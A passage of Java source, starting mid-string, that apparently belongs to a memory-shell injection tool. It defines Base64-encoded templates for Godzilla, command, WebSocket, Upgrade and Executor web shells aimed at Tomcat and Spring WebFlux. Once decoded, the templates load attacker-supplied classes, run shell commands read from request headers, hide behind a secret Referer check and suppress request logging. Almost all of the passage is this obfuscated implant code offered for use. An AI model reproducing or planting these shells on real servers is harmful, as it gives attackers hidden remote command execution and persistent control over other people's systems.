HJlYW0oKTsKCQkJCQkJT2JqZWN0ICAgICAgICAgICAgICAgICAgICAgICAgZiAgICAgID0gcGF5bG9hZC5uZXdJbnN0YW5jZSgpOwoJCQkJCQlPYmplY3QgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIgPSBnZXRNZXRob2RBbmRJbnZva2UocmVzcCwgImdldFdyaXRlciIsIG51bGwsIG51bGwpOwoJCQkJCQlmLmVxdWFscyhhcnJPdXQpOwoJCQkJCQlmLmVxdWFscyhkYXRhKTsKCQkJCQkJZi5lcXVhbHMocmVxKTsKCQkJCQkJZ2V0TWV0aG9kQW5kSW52b2tlKHdyaXRlciwgIndyaXRlIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSwgbmV3IE9iamVjdFtde21kNS5zdWJzdHJpbmcoMCwgMTYpfSk7CgkJCQkJCWYudG9TdHJpbmcoKTsKCQkJCQkJZ2V0TWV0aG9kQW5kSW52b2tlKHdyaXRlciwgIndyaXRlIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSwgbmV3IE9iamVjdFtde2Jhc2U2NEVuY29kZSh4KGFyck91dC50b0J5dGVBcnJheSgpLCB0cnVlKSl9KTsKCQkJCQkJZ2V0TWV0aG9kQW5kSW52b2tlKHdyaXRlciwgIndyaXRlIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSwgbmV3IE9iamVjdFtde21kNS5zdWJzdHJpbmcoMTYpfSk7CgkJCQkJCWdldE1ldGhvZEFuZEludm9rZSh3cml0ZXIsICJmbHVzaCIsIG51bGwsIG51bGwpOwoJCQkJCQlnZXRNZXRob2RBbmRJbnZva2Uod3JpdGVyLCAiY2xvc2UiLCBudWxsLCBudWxsKTsKCQkJCQl9CgkJCQl9CgkJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7CgkJCX0KCQl9";

	public static String GODZILLA_SHELL_FOR_WEBFLUX = "ewogICAgamF2YS5sYW5nLlN0cmluZ0J1aWxkZXIgc2IgPSAkMTsKICAgIG9yZy5zcHJpbmdmcmFtZXdvcmsudXRpbC5NdWx0aVZhbHVlTWFwIHZhbHVlTWFwID0gJDI7CiAgICBTdHJpbmcgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzICAgICA9ICJzdTE4IjsKICAgIFN0cmluZyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1kNSAgICAgID0gbWQ1KHBhc3MgKyB4Yyk7CiAgICBTdHJpbmcgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzU3RyICA9IHZhbHVlTWFwLmdldEZpcnN0KHBhc3MpLnRvU3RyaW5nKCk7CiAgICB0cnkgewoJICAgIGJ5dGVbXSBkYXRhID0geChiYXNlNjREZWNvZGUocGFzc1N0ciksIGZhbHNlKTsKCSAgICBpZiAoc3RvcmUuZ2V0KCJwYXlsb2FkIikgPT0gbnVsbCkgewoJCSAgICBqYXZhLm5ldC5VUkxDbGFzc0xvYWRlciAgdXJsQ2xhc3NMb2FkZXIgPSBuZXcgamF2YS5uZXQuVVJMQ2xhc3NMb2FkZXIobmV3IGphdmEubmV0LlVSTFswXSwgVGhyZWFkLmN1cnJlbnRUaHJlYWQoKS5nZXRDb250ZXh0Q2xhc3NMb2FkZXIoKSk7CgkJICAgIGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCBkZWZNZXRob2QgICAgICA9IENsYXNzTG9hZGVyLmNsYXNzLmdldERlY2xhcmVkTWV0aG9kKCJkZWZpbmVDbGFzcyIsIG5ldyBDbGFzc1tde2J5dGVbXS5jbGFzcywgaW50LmNsYXNzLCBpbnQuY2xhc3N9KTsKCQkgICAgZGVmTWV0aG9kLnNldEFjY2Vzc2libGUodHJ1ZSk7CgkJICAgIHN0b3JlLnB1dCgicGF5bG9hZCIsIChDbGFzcykgZGVmTWV0aG9kLmludm9rZSh1cmxDbGFzc0xvYWRlciwgbmV3IE9iamVjdFtde2RhdGEsIEludGVnZXIudmFsdWVPZigwKSwgSW50ZWdlci52YWx1ZU9mKGRhdGEubGVuZ3RoKX0pKTsKCSAgICB9IGVsc2UgewoJICAgIAlzdG9yZS5wdXQoInBhcmFtZXRlcnMiLCBkYXRhKTsKCQkgICAgamF2YS5pby5CeXRlQXJyYXlPdXRwdXRTdHJlYW0gYXJyT3V0ID0gbmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7CgkJICAgIE9iamVjdCAgICAgICAgICAgICAgICAgICAgICAgIGYgICAgICA9ICgoQ2xhc3MpIHN0b3JlLmdldCgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpOwoJCSAgICBmLmVxdWFscyhhcnJPdXQpOwoJCSAgICBmLmVxdWFscyhkYXRhKTsKCQkgICAgc2IuYXBwZW5kKG1kNS5zdWJzdHJpbmcoMCwgMTYpKTsKCQkgICAgZi50b1N0cmluZygpOwoJCSAgICBzYi5hcHBlbmQoYmFzZTY0RW5jb2RlKHgoYXJyT3V0LnRvQnl0ZUFycmF5KCksIHRydWUpKSk7CgkJICAgIHNiLmFwcGVuZChtZDUuc3Vic3RyaW5nKDE2KSk7CgkgICAgfQogICAgfSBjYXRjaCAoRXhjZXB0aW9uIGlnbm9yZWQpIHsKICAgIH0KfQ==";

	public static String GODZILLA_RAW_SHELL = "ewoJT2JqZWN0IHJlcSAgPSAkMTsKCU9iamVjdCByZXNwID0gJDI7Cgl0cnkgewoJCU9iamVjdCByZWZlcmVyID0gZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldEhlYWRlciIsIG5ldyBDbGFzc1tde1N0cmluZy5jbGFzc30sIG5ldyBPYmplY3RbXXsiUmVmZXJlciJ9KTsKCQlpZiAocmVmZXJlciAhPSBudWxsICYmIHJlZmVyZXIudG9TdHJpbmcoKS5lcXVhbHNJZ25vcmVDYXNlKCJodHRwczovL3N1MTgub3JnLyIpKSB7CgkJCW5vTG9nKHJlcSk7CgkJCU9iamVjdCBsZW5ndGggPSBnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0SGVhZGVyIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSwgbmV3IE9iamVjdFtdeyJDb250ZW50LUxlbmd0aCJ9KTsKCQkJYnl0ZVtdIGRhdGEgPSBuZXcgYnl0ZVtJbnRlZ2VyLnBhcnNlSW50KGxlbmd0aC50b1N0cmluZygpKV07CgkJCWphdmEuaW8uSW5wdXRTdHJlYW0gaW5wdXRTdHJlYW0gPSAoamF2YS5pby5JbnB1dFN0cmVhbSkgZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldElucHV0U3RyZWFtIiwgbnVsbCwgbnVsbCk7CgkJCWludCBfbnVtID0gMDsKICAgICAgICAgICAgd2hpbGUgKChfbnVtICs9IGlucHV0U3RyZWFtLnJlYWQoZGF0YSwgX251bSwgZGF0YS5sZW5ndGgpKSA8IGRhdGEubGVuZ3RoKSA7CgkJCWRhdGEgPSB4KGRhdGEsIGZhbHNlKTsKCgkJCWlmIChwYXlsb2FkID09IG51bGwpIHsKCQkJCWphdmEubmV0LlVSTENsYXNzTG9hZGVyIHVybENsYXNzTG9hZGVyID0gbmV3IGphdmEubmV0LlVSTENsYXNzTG9hZGVyKG5ldyBqYXZhLm5ldC5VUkxbMF0sIFRocmVhZC5jdXJyZW50VGhyZWFkKCkuZ2V0Q29udGV4dENsYXNzTG9hZGVyKCkpOwoJCQkJamF2YS5sYW5nLnJlZmxlY3QuTWV0aG9kICAgICAgICAgZGVmTWV0aG9kICAgICAgPSBDbGFzc0xvYWRlci5jbGFzcy5nZXREZWNsYXJlZE1ldGhvZCgiZGVmaW5lQ2xhc3MiLCBuZXcgQ2xhc3NbXXtieXRlW10uY2xhc3MsIGludC5jbGFzcywgaW50LmNsYXNzfSk7CgkJCQlkZWZNZXRob2Quc2V0QWNjZXNzaWJsZSh0cnVlKTsKCQkJCXBheWxvYWQgPSAoQ2xhc3MpIGRlZk1ldGhvZC5pbnZva2UodXJsQ2xhc3NMb2FkZXIsIG5ldyBPYmplY3RbXXtkYXRhLCBJbnRlZ2VyLnZhbHVlT2YoMCksIEludGVnZXIudmFsdWVPZihkYXRhLmxlbmd0aCl9KTsKCQkJfSBlbHNlIHsKCQkJCWphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtIGFyck91dCA9IG5ldyBqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSgpOwoJCQkJT2JqZWN0ICAgICAgICAgICAgICAgICAgICAgICAgZiAgICAgID0gcGF5bG9hZC5uZXdJbnN0YW5jZSgpOwoJCQkJZi5lcXVhbHMoYXJyT3V0KTsKCQkJCWYuZXF1YWxzKGRhdGEpOwoJCQkJZi50b1N0cmluZygpOwoJCQkJT2JqZWN0IG9zID0gZ2V0TWV0aG9kQW5kSW52b2tlKHJlc3AsICJnZXRPdXRwdXRTdHJlYW0iLCBudWxsLCBudWxsKTsKCQkJCWdldE1ldGhvZEFuZEludm9rZShvcywgIndyaXRlIiwgbmV3IENsYXNzW117Ynl0ZVtdLmNsYXNzfSwgbmV3IE9iamVjdFtde3goYXJyT3V0LnRvQnl0ZUFycmF5KCksIHRydWUpfSk7CgkJCQlnZXRNZXRob2RBbmRJbnZva2Uob3MsICJmbHVzaCIsIG51bGwsIG51bGwpOwoJCQkJZ2V0TWV0aG9kQW5kSW52b2tlKG9zLCAiY2xvc2UiLCBudWxsLCBudWxsKTsKCQkJfQoJCX0KCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7Cgl9Cn0=";

	public static String CMD_SHELL_FOR_TOMCAT = "ewoJT2JqZWN0IHJlcSAgPSAkMTsKCU9iamVjdCByZXNwID0gJDI7CglPYmplY3QgbGFzdFJlcXVlc3QgID0gcmVxOwoJT2JqZWN0IGxhc3RSZXNwb25zZSA9IHJlc3A7Cgl0cnkgewoJCU9iamVjdCByZWZlcmVyID0gZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldEhlYWRlciIsIG5ldyBDbGFzc1tde1N0cmluZy5jbGFzc30sIG5ldyBPYmplY3RbXXsiUmVmZXJlciJ9KTsKCQlpZiAocmVmZXJlciAhPSBudWxsICYmIHJlZmVyZXIudG9TdHJpbmcoKS5lcXVhbHNJZ25vcmVDYXNlKCJodHRwczovL3N1MTgub3JnLyIpKSB7CgkJCXRyeSB7CgkJCQlDbGFzcyByZXF1ZXN0RmFjYWRlQ2xhc3MgID0gQ2xhc3MuZm9yTmFtZSgib3JnLmFwYWNoZS5jYXRhbGluYS5jb25uZWN0b3IuUmVxdWVzdEZhY2FkZSIsIHRydWUsIFRocmVhZC5jdXJyZW50VGhyZWFkKCkuZ2V0Q29udGV4dENsYXNzTG9hZGVyKCkpOwoJCQkJCQlDbGFzcyByZXNwb25zZUZhY2FkZUNsYXNzID0gQ2xhc3MuZm9yTmFtZSgib3JnLmFwYWNoZS5jYXRhbGluYS5jb25uZWN0b3IuUmVzcG9uc2VGYWNhZGUiLCB0cnVlLCBUaHJlYWQuY3VycmVudFRocmVhZCgpLmdldENvbnRleHRDbGFzc0xvYWRlcigpKTsKCgkJCQlpZiAoIShyZXNwb25zZUZhY2FkZUNsYXNzLmlzQXNzaWduYWJsZUZyb20obGFzdFJlc3BvbnNlLmdldENsYXNzKCkpKSkgewoJCQkJCWxhc3RSZXNwb25zZSA9IGdldE1ldGhvZEFuZEludm9rZShyZXNwLCAiZ2V0UmVzcG9uc2UiLCBudWxsLCBudWxsKTsKCQkJCQl3aGlsZSAodHJ1ZSkgewoJCQkJCQlpZiAocmVzcG9uc2VGYWNhZGVDbGFzcy5pc0Fzc2lnbmFibGVGcm9tKGxhc3RSZXNwb25zZS5nZXRDbGFzcygpKSkgYnJlYWs7CgkJCQkJCWxhc3RSZXNwb25zZSA9IGdldE1ldGhvZEFuZEludm9rZShsYXN0UmVzcG9uc2UsICJnZXRSZXNwb25zZSIsIG51bGwsIG51bGwpOwoJCQkJCX0KCQkJCX0KCQkJfSBjYXRjaCAoRXhjZXB0aW9uIGlnbm9yZWQpIHsKCQkJfQoJCQlub0xvZyhyZXEpOwoKCQkJT2JqZWN0IGhlYWRlciA9IGdldE1ldGhvZEFuZEludm9rZShyZXEsICJnZXRIZWFkZXIiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9LCBuZXcgT2JqZWN0W117IlgtVG9rZW4tRGF0YSJ9KTsKCQkJT2JqZWN0IHdyaXRlciA9IGdldE1ldGhvZEFuZEludm9rZShyZXNwLCAiZ2V0V3JpdGVyIiwgbnVsbCwgbnVsbCk7CgoJCQlpZiAoaGVhZGVyICE9IG51bGwgJiYgIWhlYWRlci50b1N0cmluZygpLmlzRW1wdHkoKSkgewoJCQkJZ2V0TWV0aG9kQW5kSW52b2tlKHdyaXRlciwgIndyaXRlIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSwgbmV3IE9iamVjdFtde25ldyBTdHJpbmcoZXhlY0NtZChoZWFkZXIudG9TdHJpbmcoKSkudG9CeXRlQXJyYXkoKSl9KTsKCQkJfQoKCQkJZ2V0TWV0aG9kQW5kSW52b2tlKHdyaXRlciwgImZsdXNoIiwgbnVsbCwgbnVsbCk7CgkJCWdldE1ldGhvZEFuZEludm9rZSh3cml0ZXIsICJjbG9zZSIsIG51bGwsIG51bGwpOwoJCX0KCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7Cgl9Cn0=";

	public static String CMD_SHELL = "ewoJCQlPYmplY3QgcmVxICAgICA9ICQxOwoJCQlPYmplY3QgcmVzcCAgICA9ICQyOwoJCQlPYmplY3QgcmVmZXJlciA9IGdldE1ldGhvZEFuZEludm9rZShyZXEsICJnZXRIZWFkZXIiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9LCBuZXcgT2JqZWN0W117IlJlZmVyZXIifSk7CgkJCWlmIChyZWZlcmVyICE9IG51bGwgJiYgcmVmZXJlci50b1N0cmluZygpLmVxdWFsc0lnbm9yZUNhc2UoImh0dHBzOi8vc3UxOC5vcmcvIikpIHsKCQkJCU9iamVjdCBoZWFkZXIgPSBnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0SGVhZGVyIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSwgbmV3IE9iamVjdFtdeyJYLVRva2VuLURhdGEifSk7CgkJCQlPYmplY3Qgd3JpdGVyID0gZ2V0TWV0aG9kQW5kSW52b2tlKHJlc3AsICJnZXRXcml0ZXIiLCBudWxsLCBudWxsKTsKCgkJCQlpZiAoaGVhZGVyICE9IG51bGwgJiYgIWhlYWRlci50b1N0cmluZygpLmlzRW1wdHkoKSkgewoJCQkJCWdldE1ldGhvZEFuZEludm9rZSh3cml0ZXIsICJ3cml0ZSIsIG5ldyBDbGFzc1tde1N0cmluZy5jbGFzc30sIG5ldyBPYmplY3RbXXtuZXcgU3RyaW5nKGV4ZWNDbWQoaGVhZGVyLnRvU3RyaW5nKCkpLnRvQnl0ZUFycmF5KCkpfSk7CgkJCQl9CgoJCQkJZ2V0TWV0aG9kQW5kSW52b2tlKHdyaXRlciwgImZsdXNoIiwgbnVsbCwgbnVsbCk7CgkJCQlnZXRNZXRob2RBbmRJbnZva2Uod3JpdGVyLCAiY2xvc2UiLCBudWxsLCBudWxsKTsKCQkJfQoJCX0=";

	public static String CMD_SHELL_FOR_WEBFLUX = "ewogICAgamF2YS5sYW5nLlN0cmluZ0J1aWxkZXIgc2IgPSAkMTsKICAgIHNiLmFwcGVuZChleGVjQ21kKHRoaXMuQ09NTUFORCkpOwp9";

	public static String WS_SHELL = "ewogICAgdHJ5IHsKICAgICAgICBTdHJpbmcgY21kID0gJDE7ICAgICAgIAogICAgICAgIHRoaXMuc2Vzc2lvbi5nZXRCYXNpY1JlbW90ZSgpLnNlbmRUZXh0KGV4ZWNDbWQoY21kKS50b1N0cmluZygpKTsKICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7CiAgICB9Cn0=";

	public static String UPGRADE_SHELL = "ewoJCW9yZy5hcGFjaGUuY295b3RlLlJlcXVlc3QgcmVxdWVzdCA9ICQxOwoKCQl0cnkgewoJCQlTdHJpbmcgICAgICAgICAgICAgICAgICAgICBjb21tYW5kICA9IHJlcXVlc3QuZ2V0SGVhZGVyKCJzdTE4Iik7CgkJCW9yZy5hcGFjaGUuY295b3RlLlJlc3BvbnNlIHJlc3BvbnNlID0gKG9yZy5hcGFjaGUuY295b3RlLlJlc3BvbnNlKSBnZXRGaWVsZFZhbHVlKHJlcXVlc3QsICJyZXNwb25zZSIpOwoJCQlyZXNwb25zZS5kb1dyaXRlKGphdmEubmlvLkJ5dGVCdWZmZXIud3JhcChleGVjQ21kKGNvbW1hbmQpLnRvQnl0ZUFycmF5KCkpKTsKCQl9IGNhdGNoIChFeGNlcHRpb24gaWdub3JlZCkgewoJCX0KCgkJcmV0dXJuIGZhbHNlOwoJfQ==";

	public static String EXECUTOR_SHELL = "ewoJU3RyaW5nIGNtZCA9IGdldFJlcXVlc3QoKTsKCWlmIChjbWQubGVuZ3RoKCkgPiAxKSB7CgkJZ2V0UmVzcG9uc2UoZXhlY0NtZChjbWQpLnRvQnl0ZUFycmF5KCkpOwoJfQoJdGhpcy5leGVjdXRlKCQxLCBMb25nLnBhcnNlTG9uZygiMCIpLCBqYXZhLnV0aWwuY29uY3VycmVudC5UaW1lVW5pdC5NSUxMSVNFQ09ORFMpOwp9";

	// executor 需要的从线程里获取 request 对象的方法，需要 getFieldValue TAG 属性
	public static String GET_REQUEST = "cHVibGljIFN0cmluZyBnZXRSZXF1ZXN0KCkgewoJdHJ5IHsKCQlUaHJlYWRbXSB0aHJlYWRzID0gKFRocmVhZFtdKSAoKFRocmVhZFtdKSBnZXRGaWVsZFZhbHVlKFRocmVhZC5jdXJyZW50VGhyZWFkKCkuZ2V0VGhyZWFkR3JvdXAoKSwgInRocmVhZHMiKSk7CgkJZm9yIChpbnQgaSA9IDA7IGkgPCB0aHJlYWRzLmxlbmd0aDsgaSsrKSB7CgkJCVRocmVhZCB0aHJlYWQgPSB0aHJlYWRzW2ldOwoJCQlpZiAodGhyZWFkICE9IG51bGwpIHsKCQkJCVN0cmluZyB0aHJlYWROYW1lID0gdGhyZWFkLmdldE5hbWUoKTsKCQkJCWlmICghdGhyZWFkTmFtZS5jb250YWlucygiZXhlYyIpICYmIHRocmVhZE5hbWUuY29udGFpbnMoIkFjY2VwdG9yIikpIHsKCQkJCQlPYmplY3QgdGFyZ2V0ID0gZ2V0RmllbGRWYWx1ZSh0aHJlYWQsICJ0YXJnZXQiKTsKCQkJCQlpZiAodGFyZ2V0IGluc3RhbmNlb2YgamF2YS5sYW5nLlJ1bm5hYmxlKSB7CgkJCQkJCXRyeSB7CgkJCQkJCQlPYmplY3RbXSBvYmplY3RzID0gKE9iamVjdFtdKSBnZXRGaWVsZFZhbHVlKGdldEZpZWxkVmFsdWUoZ2V0RmllbGRWYWx1ZSh0YXJnZXQsICJ0aGlzJDAiKSwgIm5pb0NoYW5uZWxzIiksICJzdGFjayIpOwoJCQkJCQkJamF2YS5uaW8uQnl0ZUJ1ZmZlciBoZWFwQnl0ZUJ1ZmZlciA9IChqYXZhLm5pby5CeXRlQnVmZmVyKSBnZXRGaWVsZFZhbHVlKGdldEZpZWxkVmFsdWUob2JqZWN0c1swXSwgImFwcFJlYWRCdWZIYW5kbGVyIiksImJ5dGVCdWZmZXIiKTsKCQkJCQkJCVN0cmluZyAgICAgYSAgICAgICAgICAgICAgPSBuZXcgU3RyaW5nKGhlYXBCeXRlQnVmZmVyLmFycmF5KCksICJVVEYtOCIpOwoJCQkJCQkJaWYgKGEuY29udGFpbnMoVEFHKSkgewoJCQkJCQkJCXJldHVybiBhLnN1YnN0cmluZyhhLmluZGV4T2YoVEFHKSArIFRBRy5sZW5ndGgoKSArIDEsIGEuaW5kZXhPZigiXHIiLCBhLmluZGV4T2YoVEFHKSkgLSAxKTsKCQkJCQkJCX0KCQkJCQkJfSBjYXRjaCAoRXhjZXB0aW9uIGlnbm9yZWQpIHsKCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJfQoJCQkKCQl9Cgl9IGNhdGNoIChFeGNlcHRpb24gaWdub3JlZCkgewoJfQoJcmV0dXJuICIiOwp9";

	// executor 需要的将结果写回 response 对象的方法，需要 getFieldValue base64Encode
	public static String GET_RESPONSE = "cHVibGljIHZvaWQgZ2V0UmVzcG9uc2UoYnl0ZVtdIHJlcykgewoJCXRyeSB7CgkJCVRocmVhZFtdIHRocmVhZHMgPSAoVGhyZWFkW10pICgoVGhyZWFkW10pIGdldEZpZWxkVmFsdWUoVGhyZWFkLmN1cnJlbnRUaHJlYWQoKS5nZXRUaHJlYWRHcm91cCgpLCAidGhyZWFkcyIpKTsKCgkJCWZvciAoaW50IGkgPSAwOyBpIDwgdGhyZWFkcy5sZW5ndGg7IGkrKykgewoJCQkJVGhyZWFkIHRocmVhZCA9IHRocmVhZHNbaV07CgkJCQlpZiAodGhyZWFkICE9IG51bGwpIHsKCQkJCQlTdHJpbmcgdGhyZWFkTmFtZSA9IHRocmVhZC5nZXROYW1lKCk7CgkJCQkJaWYgKCF0aHJlYWROYW1lLmNvbnRhaW5zKCJleGVjIikgJiYgdGhyZWFkTmFtZS5jb250YWlucygiQWNjZXB0b3IiKSkgewoJCQkJCQlPYmplY3QgdGFyZ2V0ID0gZ2V0RmllbGRWYWx1ZSh0aHJlYWQsICJ0YXJnZXQiKTsKCQkJCQkJaWYgKHRhcmdldCBpbnN0YW5jZW9mIFJ1bm5hYmxlKSB7CgkJCQkJCQl0cnkgewoJCQkJCQkJCWphdmEudXRpbC5BcnJheUxpc3Qgb2JqZWN0cyA9IChqYXZhLnV0aWwuQXJyYXlMaXN0KSBnZXRGaWVsZFZhbHVlKGdldEZpZWxkVmFsdWUoZ2V0RmllbGRWYWx1ZShnZXRGaWVsZFZhbHVlKHRhcmdldCwgInRoaXMkMCIpLCAiaGFuZGxlciIpLCAiZ2xvYmFsIiksICJwcm9jZXNzb3JzIik7CgoJCQkJCQkJCWZvciAoaW50IGogPSAwOyBqIDwgb2JqZWN0cy5zaXplKCk7IGorKykgewoJCQkJCQkJCQlvcmcuYXBhY2hlLmNveW90ZS5SZXF1ZXN0SW5mbyByZXF1ZXN0ICA9IChvcmcuYXBhY2hlLmNveW90ZS5SZXF1ZXN0SW5mbykgb2JqZWN0cy5nZXQoaik7CgkJCQkJCQkJCW9yZy5hcGFjaGUuY295b3RlLlJlc3BvbnNlICAgIHJlc3BvbnNlID0gKG9yZy5hcGFjaGUuY295b3RlLlJlc3BvbnNlKSBnZXRGaWVsZFZhbHVlKGdldEZpZWxkVmFsdWUocmVxdWVzdCwgInJlcSIpLCAicmVzcG9uc2UiKTsKCQkJCQkJCQkJcmVzcG9uc2UuYWRkSGVhZGVyKCJTZXJ2ZXItdG9rZW4iLCBiYXNlNjRFbmNvZGUocmVzKSk7CgkJCQkJCQkJfQoJCQkJCQkJfSBjYXRjaCAoRXhjZXB0aW9uIGlnbm9yZWQpIHsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJfQoJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7CgkJfQoJfQ";

	// toCString
	public static String TO_CSTRING_Method = "CXB1YmxpYyBzdGF0aWMgYnl0ZVtdIHRvQ1N0cmluZyhTdHJpbmcgcykgewoJCWlmIChzID09IG51bGwpCgkJCXJldHVybiBudWxsOwoJCWJ5dGVbXSBieXRlcyAgPSBzLmdldEJ5dGVzKCk7CgkJYnl0ZVtdIHJlc3VsdCA9IG5ldyBieXRlW2J5dGVzLmxlbmd0aCArIDFdOwoJCVN5c3RlbS5hcnJheWNvcHkoYnl0ZXMsIDAsCgkJCQlyZXN1bHQsIDAsCgkJCQlieXRlcy5sZW5ndGgpOwoJCXJlc3VsdFtyZXN1bHQubGVuZ3RoIC0gMV0gPSAoYnl0ZSkgMDsKCQlyZXR1cm4gcmVzdWx0OwoJfQ==";

	// getMethodAndInvoke native 版
	public static String GET_METHOD_AND_INVOKE_OBSCURE = "ICAgIHB1YmxpYyBzdGF0aWMgT2JqZWN0IGdldE1ldGhvZEFuZEludm9rZShPYmplY3Qgb2JqLCBTdHJpbmcgbWV0aG9kTmFtZSwgQ2xhc3NbXSBwYXJhbWV0ZXJDbGFzcywgT2JqZWN0W10gcGFyYW1ldGVycykgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCBtZXRob2QgPSBnZXRNZXRob2RCeUNsYXNzKG9iai5nZXRDbGFzcygpLCBtZXRob2ROYW1lLCBwYXJhbWV0ZXJDbGFzcyk7CiAgICAgICAgICAgIGlmIChtZXRob2QgIT0gbnVsbCkgewoKICAgICAgICAgICAgICAgIENsYXNzICAgICAgICAgICAgICAgICAgICBjbGF6eiA9IENsYXNzLmZvck5hbWUoInN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbCIpOwogICAgICAgICAgICAgICAgamF2YS5sYW5nLnJlZmxlY3QuTWV0aG9kIG0gICAgID0gY2xhenouZ2V0RGVjbGFyZWRNZXRob2QoImludm9rZTAiLCBuZXcgQ2xhc3NbXXtqYXZhLmxhbmcucmVmbGVjdC5NZXRob2QuY2xhc3MsIE9iamVjdC5jbGFzcywgT2JqZWN0W10uY2xhc3N9KTsKICAgICAgICAgICAgICAgIG0uc2V0QWNjZXNzaWJsZSh0cnVlKTsKICAgICAgICAgICAgICAgIHJldHVybiBtLmludm9rZShudWxsLCBuZXcgT2JqZWN0W117bWV0aG9kLCBvYmosIHBhcmFtZXRlcnN9KTsKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7CiAgICAgICAgfQogICAgICAgIHJldHVybiBudWxsOwogICAgfQ==";

	// getMethodAndInvoke
	public static String GET_METHOD_AND_INVOKE = "cHVibGljIHN0YXRpYyBPYmplY3QgZ2V0TWV0aG9kQW5kSW52b2tlKE9iamVjdCBvYmosIFN0cmluZyBtZXRob2ROYW1lLCBDbGFzc1tdIHBhcmFtZXRlckNsYXNzLCBPYmplY3RbXSBwYXJhbWV0ZXJzKSB7CgkJdHJ5IHsKCQkJamF2YS5sYW5nLnJlZmxlY3QuTWV0aG9kIG1ldGhvZCA9IGdldE1ldGhvZEJ5Q2xhc3Mob2JqLmdldENsYXNzKCksIG1ldGhvZE5hbWUsIHBhcmFtZXRlckNsYXNzKTsKCQkJaWYgKG1ldGhvZCAhPSBudWxsKQoJCQkJcmV0dXJuIG1ldGhvZC5pbnZva2Uob2JqLCBwYXJhbWV0ZXJzKTsKCQl9IGNhdGNoIChFeGNlcHRpb24gaWdub3JlZCkgewoJCX0KCQlyZXR1cm4gbnVsbDsKCX0=";

	// getMethodByClass
	public static String GET_METHOD_BY_CLASS = "cHVibGljIHN0YXRpYyBqYXZhLmxhbmcucmVmbGVjdC5NZXRob2QgZ2V0TWV0aG9kQnlDbGFzcyhDbGFzcyBjcywgU3RyaW5nIG1ldGhvZE5hbWUsIENsYXNzW10gcGFyYW1ldGVycykgewoJCWphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCBtZXRob2QgPSBudWxsOwoJCXdoaWxlIChjcyAhPSBudWxsKSB7CgkJCXRyeSB7CgkJCQltZXRob2QgPSBjcy5nZXREZWNsYXJlZE1ldGhvZChtZXRob2ROYW1lLCBwYXJhbWV0ZXJzKTsKCQkJCW1ldGhvZC5zZXRBY2Nlc3NpYmxlKHRydWUpOwoJCQkJY3MgPSBudWxsOwoJCQl9IGNhdGNoIChFeGNlcHRpb24gZSkgewoJCQkJY3MgPSBjcy5nZXRTdXBlcmNsYXNzKCk7CgkJCX0KCQl9CgkJcmV0dXJuIG1ldGhvZDsKCX0=";

	// getFieldValue
	public static String GET_FIELD_VALUE = "cHVibGljIHN0YXRpYyBPYmplY3QgZ2V0RmllbGRWYWx1ZShPYmplY3Qgb2JqLCBTdHJpbmcgZmllbGROYW1lKSB0aHJvd3MgRXhjZXB0aW9uIHsKCQlqYXZhLmxhbmcucmVmbGVjdC5GaWVsZCBmID0gbnVsbDsKCQlpZiAob2JqIGluc3RhbmNlb2YgamF2YS5sYW5nLnJlZmxlY3QuRmllbGQpIHsKCQkJZiA9IChqYXZhLmxhbmcucmVmbGVjdC5GaWVsZCkgb2JqOwoJCX0gZWxzZSB7CgkJCUNsYXNzIGNzID0gb2JqLmdldENsYXNzKCk7CgkJCXdoaWxlIChjcyAhPSBudWxsKSB7CgkJCQl0cnkgewoJCQkJCWYgPSBjcy5nZXREZWNsYXJlZEZpZWxkKGZpZWxkTmFtZSk7CgkJCQkJY3MgPSBudWxsOwoJCQkJfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKCQkJCQljcyA9IGNzLmdldFN1cGVyY2xhc3MoKTsKCQkJCX0KCQkJfQoJCX0KCQlmLnNldEFjY2Vzc2libGUodHJ1ZSk7CgkJcmV0dXJuIGYuZ2V0KG9iaik7Cgl9";

	// getUnsafe
